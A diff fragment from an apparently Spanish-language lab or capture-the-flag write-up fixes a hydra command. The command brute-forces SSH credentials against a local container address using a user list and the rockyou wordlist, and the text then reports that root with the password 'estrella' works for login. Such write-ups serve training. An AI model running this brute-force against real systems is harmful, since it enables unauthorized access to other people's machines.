@@ -46,7 +46,7 @@ nano users.txt
 ```
 Una ves que tengo la lista, realizo busqueda con hydra
 ```
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t4 ssh//172.17.0.2
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
 ```
 Al realizar la busqueda encuentro que el usuario **root** y la contrasena **estrella** son validos, los utilizo para podes ingresar a travez de ssh
 ```
